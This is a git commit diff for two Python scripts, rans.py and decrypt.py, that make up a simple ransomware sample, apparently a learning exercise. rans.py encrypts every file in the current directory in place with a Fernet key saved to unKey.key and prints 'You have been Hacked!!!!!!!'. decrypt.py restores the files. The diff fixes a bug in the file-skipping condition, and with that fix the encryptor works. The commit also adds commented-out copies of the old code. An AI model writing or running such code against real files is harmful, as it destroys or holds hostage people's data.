d168fdeef174ac9f637c118831dceaa172813abf
Jackson kanchanapally <92465955+kanchanapallyjackson@users.noreply.github.com>
2023-04-18 00:57:14 +0530

    asdf

--- saldf/decrypt.py
+++ saldf/decrypt.py
@@ -1,3 +1,25 @@
+#  #!/usr/bin/env python3
+
+# import os 
+# from cryptography.fernet import Fernet
+# files=[]
+
+# for file in os.listdir():
+# 	if file=="rans.py" or file=="unKey.key" or os.path.basename(__file__):
+# 		continue
+# 	if os.path.isfile(file):
+# 		files.append(file)
+# print(files)
+
+# with open("unKey.key","rb") as key :
+# 	secretkey=key.read()
+
+# for file in files:
+# 	with open(file,"rb") as thefile:
+# 		contents = thefile.read()
+# 	contents_decrypted=Fernet(secretkey).decrypt(contents)
+# 	with open(file,"wb") as thefile:
+# 		thefile.write(contents_decrypted)
  #!/usr/bin/env python3
 
 import os 
@@ -5,7 +27,7 @@ from cryptography.fernet import Fernet
 files=[]
 
 for file in os.listdir():
-	if file=="rans.py" or file=="unKey.key" or os.path.basename(__file__):
+	if file=="rans.py" or file=="unKey.key" or file=="decrypt.py":
 		continue
 	if os.path.isfile(file):
 		files.append(file)
--- saldf/rans.py
+++ saldf/rans.py
@@ -1,3 +1,27 @@
+#  #!/usr/bin/env python3
+
+# import os 
+# from cryptography.fernet import Fernet
+# files=[]
+
+# for file in os.listdir():
+# 	# if file=="rans.py" or file=="unKey.key" or file=="decrypt.py":
+# 	if os.path.basename(__file__) or file=="unKey.key" or file=="decrypt.py":
+# 		continue
+# 	if os.path.isfile(file):
+# 		files.append(file)
+# print(files)
+
+# key = Fernet.generate_key()
+# with open("unKey.key","wb") as uk:
+# 	uk.write(key)
+
+# for file in files:
+# 	with open(file,"rb") as thefile:
+# 		contents = thefile.read()
+# 	contents_encrypted=Fernet(key).encrypt(contents)
+# 	with open(file,"wb") as thefile:
+# 		thefile.write(contents_encrypted)
  #!/usr/bin/env python3
 
 import os 
@@ -5,8 +29,7 @@ from cryptography.fernet import Fernet
 files=[]
 
 for file in os.listdir():
-	# if file=="rans.py" or file=="unKey.key" or file=="decrypt.py":
-	if os.path.basename(__file__) or file=="unKey.key" or file=="decrypt.py":
+	if file=="rans.py" or file=="unKey.key" or file=="decrypt.py":
 		continue
 	if os.path.isfile(file):
 		files.append(file)
@@ -22,5 +45,6 @@ for file in files:
 	contents_encrypted=Fernet(key).encrypt(contents)
 	with open(file,"wb") as thefile:
 		thefile.write(contents_encrypted)
+
 print("-----------------You have been Hacked!!!!!!!-------------")
 input()
